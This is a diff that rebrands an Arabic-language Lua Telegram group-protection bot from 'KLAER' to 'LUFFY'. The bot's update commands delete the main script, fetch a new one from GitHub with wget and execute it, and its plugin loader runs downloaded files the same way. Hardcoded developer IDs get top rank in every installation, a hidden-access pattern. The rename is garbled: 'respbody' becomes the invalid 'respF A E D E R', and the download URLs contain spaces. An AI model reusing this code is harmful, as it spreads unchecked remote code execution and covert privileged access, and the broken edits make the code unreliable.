@@ -37,7 +37,7 @@ end
 else
 print('\27[0;35m●○━━━━LUFFY━━━━○●\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
-os.execute('lua KLAER.lua')
+os.execute('lua LUFFY.lua')
 end
 if not bot_data:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\n●○━━━━LUFFY━━━━○●\n\27[0;33;49m')
@@ -57,7 +57,7 @@ bot_data:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
-os.execute('lua KLAER.lua')
+os.execute('lua LUFFY.lua')
 end
 local create_config_auto = function()
 config = {
@@ -76,10 +76,10 @@ UserName = bot_data:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-file = io.open("KLAER", "w")  
+file = io.open("LUFFY", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/KLAER
+cd $HOME/LUFFY
 token="]]..bot_data:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
@@ -99,18 +99,18 @@ echo -e "\033[38;5;208m"
 echo -e "                                                  "
 echo -e "\033[0;00m"
 echo -e "\e[36m"
-./tg -s ./KLAER.lua -p PROFILE --bot=$token
+./tg -s ./LUFFY.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
 file = io.open("DRG", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/KLAER
+cd $HOME/LUFFY
 while(true) do
 rm -fr ../.telegram-cli
-screen -S LUFFY-X kill
-screen -S LUFFY./KLAER
+screen -S LUFFY -X kill
+screen -S LUFFY ./LUFFY
 done
 ]])  
 file:close() 
@@ -159,7 +159,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/mostafanotbody/KLAER1/main/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/LucasnotF A E D E R/LUFFY1/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -175,24 +175,24 @@ end
 
 dev_users = {2078351596,2043322422,1266661700,2002733946}   
 function Developers(msg)  
-local LUFFY = false 
+local LUFFY = false  
 for k,v in pairs(dev_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
-LUFFY= true  
+LUFFY = true  
 end  
 end  
-return LUFFY 
+return LUFFY  
 end 
 
 sudo_users = {SUDO,2078351596,2043322422,1266661700,2002733946}   
 function SudoBot(msg)  
-local LUFFY= false  
+local LUFFY = false  
 for k,v in pairs(sudo_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
-LUFFY= true  
+LUFFY = true  
 end  
 end  
-return LUFFY 
+return LUFFY  
 end 
 function Devban(msg) 
 local hash = bot_data:sismember(ban_id.."Dev:ban:2", msg.sender_user_id_) 
@@ -318,11 +318,7 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(2078351596) then  
 var = true 
 elseif tonumber(user_id) == tonumber(2043322422) then
-var = true
-elseif tonumber(user_id) == tonumber(1266661700) then
-var = true 
-elseif tonumber(user_id) == tonumber(2002733946) then
-var = true 
+var = true      
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(ban_id) then
@@ -347,7 +343,7 @@ elseif bot_data:sismember(ban_id..'onall'..chat_id, user_id) then
 var = true  
 elseif bot_data:sismember(ban_id..'Manager'..chat_id, user_id) then
 var = true  
-elseif bot_data:sismember(ban_id..'mostafa:MN:TF'..chat_id, user_id) then
+elseif bot_data:sismember(ban_id..'Lucas:MN:TF'..chat_id, user_id) then
 var = true 
 elseif bot_data:sismember(ban_id..'Mod:User'..chat_id, user_id) then
 var = true  
@@ -362,13 +358,13 @@ return var
 end 
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(2078351596) then  
-var = 'مبرمج السورس'
+var = 'مطور لوكاس'
 elseif tonumber(user_id) == tonumber(2043322422) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(1266661700) then
-var = 'مطور السورس'
+var = 'مطور سورس'
 elseif tonumber(user_id) == tonumber(2002733946) then
-var = 'مطور السورس'
+var = 'مطور سورس₂'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif bot_data:sismember(ban_id.."Dev:ban:2", user_id) then
@@ -585,35 +581,35 @@ end
 end,nil)   
 end 
 function Total_Msg(msgs)  
-local KLAER_Msg = ''  
+local LUFFY_Msg = ''  
 if msgs < 100 then 
-KLAER_Msg = 'غير متفاعل' 
+LUFFY_Msg = 'غير متفاعل' 
 elseif msgs < 200 then 
-KLAER_Msg = 'بده يتحسن' 
+LUFFY_Msg = 'بده يتحسن' 
 elseif msgs < 400 then 
-KLAER_Msg = 'شبه متفاعل' 
+LUFFY_Msg = 'شبه متفاعل' 
 elseif msgs < 700 then 
-KLAER_Msg = 'متفاعل' 
+LUFFY_Msg = 'متفاعل' 
 elseif msgs < 1200 then 
-KLAER_Msg = 'متفاعل قوي' 
+LUFFY_Msg = 'متفاعل قوي' 
 elseif msgs < 2000 then 
-KLAER_Msg = 'متفاعل جدا' 
+LUFFY_Msg = 'متفاعل جدا' 
 elseif msgs < 3500 then 
-KLAER_Msg = 'اقوى تفاعل'  
+LUFFY_Msg = 'اقوى تفاعل'  
 elseif msgs < 4000 then 
-KLAER_Msg = 'متفاعل نار' 
+LUFFY_Msg = 'متفاعل نار' 
 elseif msgs < 4500 then 
-KLAER_Msg = 'قمة التفاعل'
+LUFFY_Msg = 'قمة التفاعل'
 elseif msgs < 5500 then 
-KLAER_Msg = 'اقوى متفاعل' 
+LUFFY_Msg = 'اقوى متفاعل' 
 elseif msgs < 7000 then 
-KLAER_Msg = 'ملك التفاعل' 
+LUFFY_Msg = 'ملك التفاعل' 
 elseif msgs < 9500 then 
-KLAER_Msg = 'امبروطور التفاعل' 
+LUFFY_Msg = 'امبروطور التفاعل' 
 elseif msgs < 10000000000 then 
-KLAER_Msg = 'رب التفاعل'  
+LUFFY_Msg = 'رب التفاعل'  
 end 
-return KLAER_Msg 
+return LUFFY_Msg 
 end
 function Get_Info(msg,chat,user) 
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
@@ -763,16 +759,16 @@ function GetFile_Bot(msg)
 local list = bot_data:smembers(ban_id..'Chek:Groups') 
 local t = '{"ban_id": '..ban_id..',"GP_BOT":{'  
 for k,v in pairs(list) do   
-NAME = 'LUFFYChat'
+NAME = 'LUFFY Chat'
 link = bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) or ''
 ASAS = bot_data:smembers(ban_id..'Basic:Constructor'..v)
 MNSH = bot_data:smembers(ban_id..'Constructor'..v)
 MDER = bot_data:smembers(ban_id..'Manager'..v)
 MOD = bot_data:smembers(ban_id..'Mod:User'..v)
 if k == 1 then
-t = t..'"'..v..'":{"KLAER":"'..NAME..'",'
+t = t..'"'..v..'":{"LUFFY":"'..NAME..'",'
 else
-t = t..',"'..v..'":{"KLAER":"'..NAME..'",'
+t = t..',"'..v..'":{"LUFFY":"'..NAME..'",'
 end
 if #ASAS ~= 0 then 
 t = t..'"ASAS":['
@@ -827,8 +823,8 @@ File:close()
 sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..ban_id..'.json', '- عدد جروبات التي في البوت { '..#list..'}')
 end
 function download_to_file(url, file_path) 
-local respbody = {} 
-local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
+local respF A E D E R = {} 
+local options = { url = url, sink = ltn12.sink.table(respF A E D E R), redirect = true } 
 local response = nil 
 options.redirect = false 
 response = {https.request(options)} 
@@ -838,7 +834,7 @@ local status = response[4]
 if code ~= 200 then return false, code 
 end 
 file = io.open(file_path, "w+") 
-file:write(table.concat(respbody)) 
+file:write(table.concat(respF A E D E R)) 
 file:close() 
 return file_path, code 
 end 
@@ -981,12 +977,12 @@ return false
 end
 end,nil)   
 end  
-function plugin_KLAER(msg)
+function plugin_LUFFY(msg)
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
 plugin = dofile("File_Bot/"..v)
 if plugin.LUFFY and msg then
-pre_msg = plugin.KLAER(msg)
+pre_msg = plugin.LUFFY(msg)
 end
 end
 end
@@ -1008,7 +1004,7 @@ send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n 
 end
 return false
 end
-local list = bot_data:smembers(ban_id.."botss:KLAER:List:Rd:Sudo")
+local list = bot_data:smembers(ban_id.."botss:LUFFY:List:Rd:Sudo")
 text = "\nقائمة ردود المتعدده \n●○━━━━LUFFY━━━━○●\n"
 for k,v in pairs(list) do
 db = "رساله "
@@ -1030,7 +1026,7 @@ send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n 
 end
 return false
 end
-bot_data:set(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
+bot_data:set(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_," ●ارسل الرد الذي اريد اضافته")
 end
 if text == "مسح رد متعدد" and CoSu(msg) then
@@ -1043,58 +1039,58 @@ send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n 
 end
 return false
 end
-bot_data:set(ban_id.."botss:KLAER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
+bot_data:set(ban_id.."botss:LUFFY:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
 return send(msg.chat_id_, msg.id_," ●ارسل الان الكلمه لمسحها ")
 end
 if text then  
-local test = bot_data:get(ban_id.."botss:KLAER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if bot_data:get(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
-bot_data:set(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
+local test = bot_data:get(ban_id.."botss:LUFFY:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if bot_data:get(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
+bot_data:set(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-bot_data:set(ban_id.."botss:KLAER:Add:Rd:Sudo:Text"..test, text)  
+bot_data:set(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," ●تم حفظ الرد الاول ارسل الرد الثاني")
 return false  
 end  
 end
 if text then  
-local test = bot_data:get(ban_id.."botss:KLAER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if bot_data:get(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
-bot_data:set(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
+local test = bot_data:get(ban_id.."botss:LUFFY:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if bot_data:get(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
+bot_data:set(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-bot_data:set(ban_id.."botss:KLAER:Add:Rd:Sudo:Text1"..test, text)  
+bot_data:set(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text1"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," ●تم حفظ الرد الثاني ارسل الرد الثالث")
 return false  
 end  
 end
 if text then  
-local test = bot_data:get(ban_id.."botss:KLAER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
-if bot_data:get(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
-bot_data:set(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
+local test = bot_data:get(ban_id.."botss:LUFFY:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
+if bot_data:get(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
+bot_data:set(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-bot_data:set(ban_id.."botss:KLAER:Add:Rd:Sudo:Text2"..test, text)  
+bot_data:set(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text2"..test, text)  
 end  
 send(msg.chat_id_, msg.id_," ●تم حفظ الرد")
 return false  
 end  
 end
 if text then
-local Text = bot_data:get(ban_id.."botss:KLAER:Add:Rd:Sudo:Text"..text)   
-local Text1 = bot_data:get(ban_id.."botss:KLAER:Add:Rd:Sudo:Text1"..text)   
-local Text2 = bot_data:get(ban_id.."botss:KLAER:Add:Rd:Sudo:Text2"..text)   
+local Text = bot_data:get(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text"..text)   
+local Text1 = bot_data:get(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text1"..text)   
+local Text2 = bot_data:get(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text2"..text)   
 if Text or Text1 or Text2 then 
 local texting = {
 Text,
@@ -1298,21 +1294,21 @@ return false
 end  
 end
 if text and text:match("^(.*)$") then
-if bot_data:get(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if bot_data:get(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_, '\n ● ارسل الكلمه تريد اضافتها')
-bot_data:set(ban_id.."botss:KLAER:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
-bot_data:set(ban_id.."botss:KLAER:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
-bot_data:sadd(ban_id.."botss:KLAER:List:Rd:Sudo", text)
+bot_data:set(ban_id.."botss:LUFFY:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
+bot_data:set(ban_id.."botss:LUFFY:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
+bot_data:sadd(ban_id.."botss:LUFFY:List:Rd:Sudo", text)
 return false end
 end
 if text and text:match("^(.*)$") then
-if bot_data:get(ban_id.."botss:KLAER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
+if bot_data:get(ban_id.."botss:LUFFY:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
 send(msg.chat_id_, msg.id_,"● تم مسح الرد من ردود المتعدده")
-bot_data:del(ban_id..'botss:KLAER:Add:Rd:Sudo:Text'..text)
-bot_data:del(ban_id..'botss:KLAER:Add:Rd:Sudo:Text1'..text)
-bot_data:del(ban_id..'botss:KLAER:Add:Rd:Sudo:Text2'..text)
-bot_data:del(ban_id.."botss:KLAER:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
-bot_data:srem(ban_id.."botss:KLAER:List:Rd:Sudo", text)
+bot_data:del(ban_id..'botss:LUFFY:Add:Rd:Sudo:Text'..text)
+bot_data:del(ban_id..'botss:LUFFY:Add:Rd:Sudo:Text1'..text)
+bot_data:del(ban_id..'botss:LUFFY:Add:Rd:Sudo:Text2'..text)
+bot_data:del(ban_id.."botss:LUFFY:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
+bot_data:srem(ban_id.."botss:LUFFY:List:Rd:Sudo", text)
 return false
 end
 end
@@ -1326,12 +1322,12 @@ send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n 
 end
 return false
 end
-local list = bot_data:smembers(ban_id.."botss:KLAER:List:Rd:Sudo")
+local list = bot_data:smembers(ban_id.."botss:LUFFY:List:Rd:Sudo")
 for k,v in pairs(list) do  
-bot_data:del(ban_id.."botss:KLAER:Add:Rd:Sudo:Text"..v) 
-bot_data:del(ban_id.."botss:KLAER:Add:Rd:Sudo:Text1"..v) 
-bot_data:del(ban_id.."botss:KLAER:Add:Rd:Sudo:Text2"..v)   
-bot_data:del(ban_id.."botss:KLAER:List:Rd:Sudo")
+bot_data:del(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text"..v) 
+bot_data:del(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text1"..v) 
+bot_data:del(ban_id.."botss:LUFFY:Add:Rd:Sudo:Text2"..v)   
+bot_data:del(ban_id.."botss:LUFFY:List:Rd:Sudo")
 end
 send(msg.chat_id_, msg.id_,"●تم مسح ردود المتعدده")
 end
@@ -1625,7 +1621,7 @@ if Chat_Type == 'UserBot' then
 if text == '/start' or text == '『رجوع』' then 
 if Devban(msg) then
 if not msa3d(msg) then
-local bl = '●انت الان المطور الثانوي في البوت \n● سورس لوفي\n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/Anime_ib)'
+local bl = '●انت الان المطور الثانوي في البوت \n● سورس كلير\n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/Anime_ib)'
 local keyboard = {
 {'الاحصائيات'},
 {'المطور','مساعد'},
@@ -1645,11 +1641,11 @@ end
 if text == "/start" then
 if not msa3d(msg) then
 if not Devban(msg) then
-local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'لوفي') 
-local KLAER_Msg = { 
+local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'كلير') 
+local LUFFY_Msg = { 
 ' ـــــــــــــــــــــــــــــــــــــــــــــــ\n   🤖╖ أهلآ بك عزيزي أنا بوت  '..Namebot..'\n🌐╢ وظيفتي حماية المجموعات\n✅╢ لتفعيل البوت عليك اتباع مايلي \n●╢ أضِف البوت إلى مجموعتك\n⚡️╢ ارفعهُ » مشرف\n⬆️╜ سيتم ترقيتك مالك في البوت\nــــــــــــــــــــــــــــــــــــــــــــــــــــ ',
 } 
-Namebot = KLAER_Msg[math.random(#KLAER_Msg)] 
+Namebot = LUFFY_Msg[math.random(#LUFFY_Msg)] 
 local msg_id = msg.id_/2097152/0.5  
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -1682,7 +1678,7 @@ end
 if Chat_Type == 'UserBot' then
 if text == '/start' or text == '『رجوع』' then  
 if msa3d(msg) then
-local bl = '●انت الان المطور الاساسي في البوت \n● سورس لوفي\n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/Anime_ib)'
+local bl = '●انت الان المطور الاساسي في البوت \n● سورس كلير\n ●يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/Anime_ib)'
 local keyboard = {
 {'ضع اسم للبوت','معلومات الكيبورد'},
 {'المطور','المساعد'},
@@ -1737,8 +1733,8 @@ end
 tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
 tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
 if ta.code_ == 400 or ta.code_ == 5 then
-local KLAER_Msg = '\n ●قام الشخص بحظر البوت'
-send(msg.chat_id_, msg.id_,KLAER_Msg) 
+local LUFFY_Msg = '\n ●قام الشخص بحظر البوت'
+send(msg.chat_id_, msg.id_,LUFFY_Msg) 
 return false  
 end 
 if text then    
@@ -1864,10 +1860,10 @@ echo '●○━━━━LUFFY━━━━○●\n 🔌l •⊱ 『 مـده تـ
 ]]):read('*all'))  
 end
 if text == 'تحديث السورس ' and DevSoFi(msg) then 
-os.execute('rm -rf KLAER.lua')
-os.execute('wget https://raw.githubusercontent.com/mostafanotbody/KLAER1/main/KLAER.lua')
+os.execute('rm -rf LUFFY.lua')
+os.execute('wget https://raw.githubusercontent.com/LucasnotF A E D E R/LUFFY1/main/LUFFY.lua')
 send(msg.chat_id_, msg.id_,'💞  تم تحديث السورس')
-dofile('KLAER.lua')  
+dofile('LUFFY.lua')  
 end
 if text == 'جلب المشتركين' and Devban(msg) then 
 local list = bot_data:smembers(ban_id..'User_Bot') 
@@ -2001,7 +1997,7 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 if text == 'الاصدار' and Devban(msg) then 
 bot_data:del(ban_id..'Srt:Bot') 
-send(msg.chat_id_, msg.id_,' ● اصدار سورس لوفي{ S:1✓}')
+send(msg.chat_id_, msg.id_,' ● اصدار سورس كلير{ S:1✓}')
 end
 if text == '⇣───『 قـناه المطورين』───⇣' then
 local Text = [[ 
@@ -2010,7 +2006,7 @@ local Text = [[
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'مطورين السورس⚙', url="t.me/ART_ABOT"}}, 
+{{text = 'مطورين السورس⚙', url="t.me/hogan21"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/911&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2064,7 +2060,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'Lucas', url="t.me/il9_9li"}}, 
+{{text = '𝚂𝙰𝚂𝙰', url="t.me/il9_9li"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2072,14 +2068,14 @@ end
 if text == 'قناه السورس' and Devban(msg) then
 bot_data:del(ban_id..'Srt:Bot') 
 local Text = [[ 
- ● من أحسن السورسات على التليجرام سورس لوفي ●
+ ● من أحسن السورسات على التليجرام سورس كلير ●
 بجد سورس أمان جدا وفي مميزات جامده
 تع نصب بوتك عندنا لو محظور
 خش على تواصل هيدخلك لروم التواصل 
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"}}, 
+{{text = 'S0URCE LUFFY', url="t.me/Anime_ib"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/xxxcccvvbbnn/911=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2275,19 +2271,19 @@ if #group == i then
 if (w + q) == 0 then
 send(msg.chat_id_, msg.id_,' ● لا يوجد جروبات وهميه في البوت\n')   
 else
-local LUFFY= (w + q)
-local sendok = #group - KLAER
+local LUFFY = (w + q)
+local sendok = #group - LUFFY
 if q == 0 then
-LUFFY= ''
+LUFFY = ''
 else
-LUFFY= '\n ● تم ازالة  ⇐ 『 '..q..' 』 جروبات من البوت'
+LUFFY = '\n ● تم ازالة  ⇐ 『 '..q..' 』 جروبات من البوت'
 end
 if w == 0 then
-KLAERk = ''
+LUFFYk = ''
 else
-KLAERk = '\n ● تم ازالة  ⇐ 『 '..w..' 』 جروب لان البوت عضو'
+LUFFYk = '\n ● تم ازالة  ⇐ 『 '..w..' 』 جروب لان البوت عضو'
 end
-send(msg.chat_id_, msg.id_,' ●  عدد الجروبات الان  ⇐ 『 '..#group..' 』'..KLAERk..''..KLAER..'\n ●  الان عدد الجروبات الحقيقي  ⇐ 『 '..sendok..' 』 جروبات\n')   
+send(msg.chat_id_, msg.id_,' ●  عدد الجروبات الان  ⇐ 『 '..#group..' 』'..LUFFYk..''..LUFFY..'\n ●  الان عدد الجروبات الحقيقي  ⇐ 『 '..sendok..' 』 جروبات\n')   
 end
 end
 end,nil)
@@ -2402,10 +2398,10 @@ end
 end
 --------------------------------------------------------------------------------------------------------------
 if text and not Special(msg) then  
-local KLAER1_Msg = bot_data:get(ban_id.."KLAER1:Add:Filter:Rp2"..text..msg.chat_id_)   
-if KLAER1_Msg then 
+local LUFFY1_Msg = bot_data:get(ban_id.."LUFFY1:Add:Filter:Rp2"..text..msg.chat_id_)   
+if LUFFY1_Msg then 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
-send(msg.chat_id_, msg.id_,' ● الـعـضو   ⇐ [『'..Rutba(msg.sender_user_id_,msg.chat_id_)..'』](T.ME/'..(data.username_ or 'textchuser')..') \n ● '..KLAER1_Msg)
+send(msg.chat_id_, msg.id_,' ● الـعـضو   ⇐ [『'..Rutba(msg.sender_user_id_,msg.chat_id_)..'』](T.ME/'..(data.username_ or 'textchuser')..') \n ● '..LUFFY1_Msg)
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
 return false
 end,nil)
@@ -2806,7 +2802,7 @@ end,nil)
 end,nil)
 end
 
-if text and text:match("^لوكاس$") or text and text:match("^صاصا$") or text and text:match("^sasa$") then
+if text and text:match("^لوكاس$") or text and text:match("^لولو$") or text and text:match("^sasa$") then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
 local Name1 = result.first_name_
@@ -2838,7 +2834,7 @@ end,nil)
 end
 
 
-if text and text:match("^فايدير$") or text and text:match("^boody$") or text and text:match("^body$") then
+if text and text:match("^فايدير$") or text and text:match("^boody$") or text and text:match("^F A E D E R$") then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
 local Name1 = result.first_name_
@@ -2886,7 +2882,7 @@ end
 if msg.content_.ID == "MessageChatAddMembers" then 
 if msg.content_.members_[0].id_ == tonumber(ban_id) then 
 print("it is Bot")
-N = (bot_data:get(ban_id.."Name:Bot") or "لوفي")
+N = (bot_data:get(ban_id.."Name:Bot") or "كلير")
 tdcli_function ({ID = "GetUser",user_id_ = ban_id,},function(arg,data) 
 tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = ban_id,offset_ = 0,limit_ = 1},function(extra,result,success) 
 if result.photos_[0] then
@@ -2979,14 +2975,14 @@ return false
 end
 end 
 --------------------------------------------------------------------------------------------------------------
-if KLAER_Msg and not Special(msg) then  
-local KLAER_Msg = bot_data:get(ban_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
-if KLAER_Msg then    
+if LUFFY_Msg and not Special(msg) then  
+local LUFFY_Msg = bot_data:get(ban_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
+if LUFFY_Msg then    
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ ~= false then
-send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ● ["..KLAER_Msg.."] \n")
+send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ● ["..LUFFY_Msg.."] \n")
 else
-send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/Anime_ib)}\n ● ["..KLAER_Msg.."] \n")
+send(msg.chat_id_,0," ● الـعـضو  : {["..data.first_name_.."](T.ME/Anime_ib)}\n ● ["..LUFFY_Msg.."] \n")
 end
 end,nil)   
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
@@ -3628,10 +3624,10 @@ send(msg.chat_id_, msg.id_,' ● لا تستطيع استخدام البوت \n 
 end
 return false
 end
-os.execute('rm -rf KLAER.lua')
-os.execute('wget https://raw.githubusercontent.com/mostafanotbody/KLAER1/main/KLAER.lua')
+os.execute('rm -rf LUFFY.lua')
+os.execute('wget https://raw.githubusercontent.com/LucasnotF A E D E R/LUFFY1/main/LUFFY.lua')
 send(msg.chat_id_, msg.id_,' ● تم تحديث السورس')
-dofile('KLAER.lua')  
+dofile('LUFFY.lua')  
 end
 
 if text and text:match("^تغير الاشتراك$") and Devban(msg) then  
@@ -3776,7 +3772,7 @@ keyboard.inline_keyboard = {
 {text = '◗ متطوره◖', callback_data="/DRG"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3795,7 +3791,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 LUFFY', url="t.me/Anime_ib"},
+{text = 'S0URCE LUFFY', url="t.me/Anime_ib"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
